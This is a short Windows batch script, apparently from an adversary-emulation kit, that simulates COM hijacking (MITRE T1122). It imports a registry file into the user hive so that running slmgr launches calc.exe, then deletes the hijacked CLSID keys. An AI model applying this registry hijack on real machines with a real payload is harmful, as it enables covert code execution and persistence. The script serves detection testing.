@ECHO OFF
CLS
color 0E

ECHO.
ECHO -----------------------------------------------------------------------
ECHO [-] Technique: COM Hijacking (T1122)
ECHO [+] Simulate COM Hijack Technique to execute "calc.exe" as Normal User
ECHO -----------------------------------------------------------------------
copy /Y %utilities%\Slmgr.reg %temp%\APT28\ > nul
reg import %temp%\APT28\Slmgr.reg
ping 127.0.0.1 -n 4 > nul
slmgr
REG DELETE HKCU\Software\Classes\Scripting.Dictionary\CLSID /f
REG DELETE HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /f
ping 127.0.0.1 -n 4 > nul
ECHO.